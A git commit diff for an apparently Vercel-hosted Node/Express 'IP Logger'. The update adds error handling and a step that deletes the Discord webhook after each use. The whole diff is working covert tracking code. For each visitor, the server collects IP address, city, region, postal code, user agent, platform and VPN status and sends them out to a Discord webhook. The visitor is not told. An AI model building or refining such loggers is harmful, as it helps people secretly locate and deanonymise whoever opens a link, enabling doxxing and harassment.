02c37b5aa8773ad2c47358f4693263136f434c40
JohnWick000101 <127307440+JohnWick000101@users.noreply.github.com>
2023-03-19 15:10:51 -0400

    updates for error handling, better linkage

--- main.js
+++ main.js
@@ -8,20 +8,44 @@ const channelID = process.env.channel_id; // set channel ID to value in vercel d
 const port = process.env.port || 3000; // set port to value in vercel dashboard/default 3000
 
 async function createWebhook(channelID) {
-  const url = `https://discord.com/api/v8/channels/${channelID}/webhooks`;
-  const response = await fetch(url, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-      'Authorization': `Bot ${botToken}`,
-    },
-    body: JSON.stringify({
-      name: 'Logger Webhook', // set the name for the webhook
-    }),
-  });
-  const data = await response.json();
-  console.log('Webhook data:', data);
-  return data.url;
+  const url = `https://discord.com/api/v10/channels/${channelID}/webhooks`;
+  try {
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Authorization': `Bot ${botToken}`,
+      },
+      body: JSON.stringify({
+        name: 'Logger Webhook', // set the name for the webhook
+      }),
+    });
+    const data = await response.json();
+    const webhookID = data.id;
+    const webhookToken = data.token;
+    return `https://discord.com/api/v10/webhooks/${webhookID}/${webhookToken}`;
+  } catch (error) {
+    console.error(`Error creating webhook: ${error}`);
+    throw error;
+  }
+}
+
+async function deleteWebhook(webhookUrl) {
+  const urlSplit = webhookUrl.split('/');
+  const webhookID = urlSplit[5];
+  const webhookToken = urlSplit[6];
+  const url = `https://discord.com/api/v10/webhooks/${webhookID}/${webhookToken}`;
+  try {
+    await fetch(url, {
+      method: 'DELETE',
+      headers: {
+        'Authorization': `Bot ${botToken}`,
+      },
+    });
+  } catch (error) {
+    console.error(`Error deleting webhook: ${error}`);
+    throw error;
+  }
 }
 
 app.get('/', async (req, res) => {
@@ -39,33 +63,42 @@ app.get('/', async (req, res) => {
   const browser = userAgent.split('/')[0];
   const isProxy = req.headers['via'] || req.headers['x-forwarded-for'];
 
-  const webhookUrl = await createWebhook(channelID);
-  console.log('Webhook URL:', webhookUrl);
-  const webhook = new Webhook(webhookUrl);
-
-  const embed = new MessageBuilder()
-    .setTitle('IP Logger')
-    .setDescription('This is an IP logger made by https://github.com/baum1810')
-    .addField('IP', ipAddress)
-    .addField('Country', country)
-    .addField('Region', region)
-    .addField('City', city)
-    .addField('Postal', postal)
-    .addField('User Agent', userAgent)
-    .addField('Browser Language', lang)
-    .addField('Platform', platform)
-    .addField('Browser', browser)
-    .addField('Proxy/VPN', isProxy ? 'Yes' : 'No')
-    .setColor('#5CDBF0')
-    .setTimestamp();
-
   try {
-    await webhook.send(embed);
-  } catch (error) {
-    console.error(`Error sending webhook: ${error}`);
-  }
+    const webhookUrl = await createWebhook(channelID);
+    const webhook = new Webhook(webhookUrl);
 
-  res.send('IP address logged');
+    const embed = new MessageBuilder()
+      .setTitle('IP Logger')
+      .setDescription('This is an IP logger made by https://github.com/baum1810')
+      .addField('IP', ipAddress)
+      .addField('Country', country)
+      .addField('Region', region)
+      .addField('City', city)
+      .addField('Postal', postal)
+      .addField('User Agent', userAgent)
+      .addField('Browser Language', lang)
+      .addField('Platform', platform)
+      .addField('Browser', browser)
+      .addField('Proxy/VPN', isProxy ? 'Yes' : 'No')
+      .setColor('#5CDBF0')
+      .setTimestamp();
+
+    await webhook.send(embed);
+
+    // wait for message to be confirmed as received before deleting the webhook
+    webhook.on('response', async () => {
+      try {
+        await deleteWebhook(webhookUrl);
+        res.send('Address Logged');
+      } catch (error) {
+        console.error(`Error deleting webhook: ${error}`);
+        res.status(500).send('Internal server error');
+      }
+    });
+  } catch (error) {
+    console.error(`Error handling request: ${error}`);
+    res.status(500).send('Internal server error');
+  }
 });
 
 app.listen(port, () => {
